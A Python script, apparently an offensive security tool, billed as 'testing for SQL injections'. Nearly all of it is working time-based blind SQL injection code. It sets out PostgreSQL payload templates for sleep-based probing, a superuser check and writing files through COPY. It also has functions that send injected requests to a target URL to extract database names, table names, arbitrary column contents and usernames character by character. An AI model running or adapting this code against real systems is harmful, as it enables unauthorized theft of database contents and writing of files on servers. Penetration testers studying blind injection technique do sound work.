#!/usr/bin/env python3

"""
Author: Aleksa Zatezalo
Date: December 2024
Version: 1.0
Description: Testing for SQL Injections, across multiple servers vulnerable to SQLi. 
"""

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time

# Postgress SQLI
PG_SLEEP = ";select+pg_sleep({SLEEP});"																					# Sleeps for num seconds
PG_IS_SUPERUSER = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep({SLEEP})+end;--+"		# Sleeps for num seconds if superuser
PG_COPY_TO_FILE = ";COPY+(SELECT+$${FILECONTENT}$$)+to+$${FILEPATH}\\{FILENAME}$$;--+"												# Echos 'string' into path\file

# SQLi Constants
SLEEP = 0
FILECONTENT = 'Hello World!'
FILENAME = "test.txt"
FILEPATH = 'C:\\'

# Setters
def setSleep(value):
    """
    Sets the global sleep duration value.

    Args:
        value (int): The sleep duration value to set.

    Returns:
        None
    """

    global SLEEP
    SLEEP = value

def setContent(value):
    """
    Sets the global file content value.

    Args:
        value (str): The file content string to set.

    Returns:
        None
    """

    global FILECONTENT
    FILECONTENT = value

def setName(value):
    """
    Sets the global filename value.

    Args:
        value (str): The filename string to set.

    Returns:
        None
    """

    global FILENAME
    FILENAME = value

def setPath(value):
    """
    Sets the global filepath value.

    Args:
        value (str): The filepath string to set.

    Returns:
        None
    """

    global FILEPATH
    FILEPATH = value

# Getters
def getSleep():
    """
    Gets the global sleep duration value.

    Returns:
        int: The current sleep duration value.
    """
    return SLEEP

def getContent():
    """
    Gets the global file content value.

    Returns:
        str: The current file content string.
    """
    return FILECONTENT

def getName():
    """
    Gets the global filename value.

    Returns:
        str: The current filename string.
    """
    return FILENAME

def getPath():
    """
    Gets the global filepath value.

    Returns:
        str: The current filepath string.
    """
    return FILEPATH

# Blind SQL functions
def checkRequestTime(url, string, max_time, proxy=None):
    """
    Performs a GET request on the concatenated URL and string, and checks if the response time exceeds max_time.

    Args:
        url (str): The base URL.
        string (str): The string to be appended to the URL.
        max_time (int): The maximum allowed response time in seconds.
        proxy (str): The proxy in the format "IP:PORT" (optional).

    Returns:
        bool: True if the response time exceeds max_time, False otherwise.
    """
    try:
        full_url = url.rstrip('/') + '/' + string.lstrip('/')
        proxies = {"http": f"http://{proxy}", "https": f"https://{proxy}"} if proxy else None
        start_time = time.time()  # Record the start time
        response = requests.get(full_url, proxies=proxies)  # Perform the GET request
        elapsed_time = time.time() - start_time  # Calculate elapsed time

        return elapsed_time > max_time
    except Exception as e:
        print(f"Error occurred: {e}")
        return False

def extractTableNames(url, base_injection, max_time, proxy=None):
    """
    Extracts database table names using time-based SQL injection.

    Args:
        url (str): The vulnerable URL.
        base_injection (str): The base SQL injection payload.
        max_time (int): The time in seconds to distinguish between True and False responses.
        proxy (str): The proxy in the format "IP:PORT" (optional).

    Returns:
        list: A list of extracted table names.
    """
    table_names = []
    index = 0

    while True:
        table_name = ""
        char_index = 1

        while True:
            found_char = False
            for char_code in range(32, 126):  # ASCII printable characters
                payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
                if checkRequestTime(url, payload, max_time, proxy):
                    table_name += chr(char_code)
                    char_index += 1
                    found_char = True
                    break

            if not found_char:
                break

        if not table_name:
            break  # Exit when no more table names are found

        print(f"Extracted table name: {table_name}")
        table_names.append(table_name)
        index += 1

    return table_names

def extractTableData(url, base_injection, table_name, column_name, max_time, proxy=None):
    """
    Extracts specific rows and columns of a table using time-based SQL injection.

    Args:
        url (str): The vulnerable URL.
        base_injection (str): The base SQL injection payload.
        table_name (str): The name of the target table.
        column_name (str): The name of the target column.
        max_time (int): The time in seconds to distinguish between True and False responses.
        proxy (str): The proxy in the format "IP:PORT" (optional).

    Returns:
        list: A list of extracted data from the specified table and column.
    """
    table_data = []
    index = 0

    while True:
        row_data = ""
        char_index = 1

        while True:
            found_char = False
            for char_code in range(32, 126):  # ASCII printable characters
                payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
                if checkRequestTime(url, payload, max_time, proxy):
                    row_data += chr(char_code)
                    char_index += 1
                    found_char = True
                    break

            if not found_char:
                break

        if not row_data:
            break  # Exit when no more rows are found

        print(f"Extracted row data: {row_data}")
        table_data.append(row_data)
        index += 1

    return table_data

def extractDatabaseNames(url, base_injection, max_time, proxy=None):
    """
    Extracts database names using time-based SQL injection.

    Args:
        url (str): The vulnerable URL.
        base_injection (str): The base SQL injection payload.
        max_time (int): The time in seconds to distinguish between True and False responses.
        proxy (str): The proxy in the format "IP:PORT" (optional).

    Returns:
        list: A list of extracted database names.
    """
    database_names = []
    index = 0

    while True:
        db_name = ""
        char_index = 1

        while True:
            found_char = False
            for char_code in range(32, 126):  # ASCII printable characters
                payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
                if checkRequestTime(url, payload, max_time, proxy):
                    db_name += chr(char_code)
                    char_index += 1
                    found_char = True
                    break

            if not found_char:
                break

        if not db_name:
            break  # Exit when no more database names are found

        print(f"Extracted database name: {db_name}")
        database_names.append(db_name)
        index += 1

    return database_names

def extractUsernames(url, base_injection, max_time, proxy=None):
    """
    Extracts usernames from the database using time-based SQL injection.

    Args:
        url (str): The vulnerable URL.
        base_injection (str): The base SQL injection payload.
        max_time (int): The time in seconds to distinguish between True and False responses.
        proxy (str): The proxy in the format "IP:PORT" (optional).

    Returns:
        list: A list of extracted usernames.
    """
    usernames = []
    index = 0

    while True:
        username = ""
        char_index = 1

        while True:
            found_char = False
            for char_code in range(32, 126):  # ASCII printable characters
                payload = f"{base_injection} AND IF(ASCII(SUBSTRING((SELECT username FROM users LIMIT {index},1),{char_index},1))={char_code},SLEEP({max_time}),0)-- -"
                if checkRequestTime(url, payload, max_time, proxy):
                    username += chr(char_code)
                    char_index += 1
                    found_char = True
                    break

            if not found_char:
                break

        if not username:
            break  # Exit when no more usernames are found

        print(f"Extracted username: {username}")
        usernames.append(username)
        index += 1

    return usernames